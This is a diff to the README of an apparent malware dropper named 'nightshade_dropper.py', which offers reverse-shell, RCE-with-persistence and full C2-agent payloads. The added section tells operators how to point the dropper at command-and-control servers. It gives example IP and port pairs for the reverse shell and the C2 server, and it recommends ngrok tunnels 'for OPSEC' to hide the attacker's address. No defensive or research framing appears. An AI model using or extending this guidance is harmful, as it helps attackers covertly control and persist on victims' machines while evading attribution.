@@ -79,9 +79,42 @@ python3 nightshade_dropper.py
 - `2` - RCE + Persistence (uses HTTP C2 endpoints)
 - `3` - Full C2 Agent (advanced features)
 
-**C2 Configuration:**
-- For Reverse Shell: Use your server IP and port 4444
-- For RCE/Full C2: Use your server IP and port 8080
+## C2 Configuration:
+
+**For Reverse Shell:**
+- If using direct connection: Use your server IP and port 4444
+- If using ngrok: Use the ngrok tunnel URL (no port needed)
+
+**For RCE/Full C2:**
+- If using direct connection: Use your server IP and port 8080  
+- If using ngrok: Use the ngrok tunnel URL (no port needed)
+
+### Ngrok Setup Example:
+```bash
+# Start ngrok tunnel for C2 server
+ngrok http 8080
+
+# Ngrok will provide a URL like: https://abc123-def4-567.ngrok-free.app
+# Use this URL in your dropper configuration instead of your IP
+```
+
+### Configuration Examples:
+
+**Direct Connection (No Ngrok):**
+```
+C2 Server: http://192.168.1.100:8080
+Reverse Shell: 192.168.1.100:4444
+```
+
+**Ngrok Tunneling (Recommended for OPSEC):**
+```
+C2 Server: https://abc123-def4-567.ngrok-free.app
+Reverse Shell: abc123-def4-567.ngrok-free.app:4444
+```
+
+**Important**: When using ngrok, you don't need to specify ports for HTTP/HTTPS traffic, but you DO need to specify the port for reverse shell connections (ngrok exposes TCP ports differently).
+```
+
 
 **Delivery Method:**
 - `1` - Ngrok tunneling (recommended)
